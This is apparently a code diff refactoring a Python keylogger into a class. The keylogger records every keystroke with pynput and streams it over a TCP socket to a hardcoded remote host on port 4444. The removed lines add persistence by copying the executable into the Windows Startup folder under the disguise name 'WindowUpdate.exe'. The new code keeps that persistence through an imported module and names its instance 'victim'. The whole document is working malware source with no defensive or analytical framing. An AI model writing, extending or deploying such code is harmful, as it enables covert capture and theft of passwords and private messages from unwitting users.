@@ -1,90 +1,81 @@
-# listener class, monitor keyboard 
-from pynput.keyboard import Listener 
+from pynput.keyboard import Listener
 import socket
-from pathlib import Path
-import sys
-import os
-import shutil
+import manipulate
 
-IP = "172.23.35.163"
-port = 4444
-address = (IP, port)
+class Keylogger():
+  
+	def __init__(self, Host, Port):
 
-def path_manipulation():
+		self.__Host = Host
+		self.__Port = Port
+		self.__key_to_discard = [
 
-	try:
-	
-			exe_file = Path(sys.executable)
-
-			start_up_folder = Path(os.environ['APPDATA']) /'Microsoft'/'Windows'/'Start Menu'/'Programs'/'Startup'
-
-			duplicate_exe_file = start_up_folder / "WindowUpdate.exe"
-			if not duplicate_exe_file.exists():
-
-				shutil.copy2(exe_file, duplicate_exe_file)
-
-	except:
-	
-			pass
-
-path_manipulation()
-
-# connecting to the client
-
-try:
-     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-     client.connect((address))
-     print(f"Connected to server {IP} on port: {port}")
-	
-except Exception as e:
-
-	print(f"Could not connect to server {e}")
-
-
-# keylogger function
-
-def writetofile(key):
-
-	try:
-
-		keystroke= str(key)
-		keystroke = keystroke.replace("'", "")
-
-		keys_to_discard = [
 			"Key.esc", "Key.ctrl", "Key.alt",
 			"Key.shift", "Key.caps_lock", "Key.backspace",
 			"Key.tab", "Key.right", "Key.ctrl_l", "key.alt_l"
 			"Key.cmdr", "Key.cmd"
+
 		]
+		self.client = None
+		self.client_connect = False
 
-		if keystroke == "Key.space":
+	def connect_server(self):
 
-				keystroke = ' '
-		
-		elif keystroke == "Key.enter":
-
-				keystroke = '\n'
-		
-		elif keystroke in keys_to_discard:
+		try:
 				
-				keystroke = ''
+				self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+				Address = (self.__Host, self.__Port)
+				self.client.connect(Address)
+				print(f"Connected to {self.__Host}:{self.__Port}")
+				self.client_connect = True
 		
+		except Exception as e:
+
+			print(f"Could not connect to Server, due to {e}")
+
+	def persistance(self):
+
+		manipulate.path_manipulation()
+	
+		
+	def write_to_file(self, key):
+
+		keystroke = str(key)
+		keystroke = keystroke.replace("'",'')
+
+		if keystroke =="Key.space":
+			keystroke = " "
+		elif keystroke == "Key.enter":
+			keystroke = "\n"
+		elif keystroke in self.__key_to_discard:
+			keystroke = ""
 		if keystroke:
-			
-				byte_msg = keystroke.encode('utf-8')
-			
-				client.sendall(byte_msg)
-		
-	except:
 
-		print("Could not connect to the server")
- 
-# on_press argument makes the function execute everytime
+			byte_msg = keystroke.encode('utf-8')
 
-with Listener(on_press=writetofile) as l:
-# put the program into a blocking state, waiting indefinitely from the listeners, until we manually terminate it
-	l.join()
+			if self.client_connect:
 
+				self.client.sendall(byte_msg)
+
+
+if __name__ == '__main__':
+	
+	Host = "192.168.0.199"
+	Port = 4444
+	victim = Keylogger(Host, Port)
+
+	victim.persistance()
+	victim.connect_server()
+
+	try:
+
+			with Listener(on_press=victim.write_to_file) as l:
+
+				l.join()
+
+	except KeyboardInterrupt:
+
+				l.stop()
 
 
 
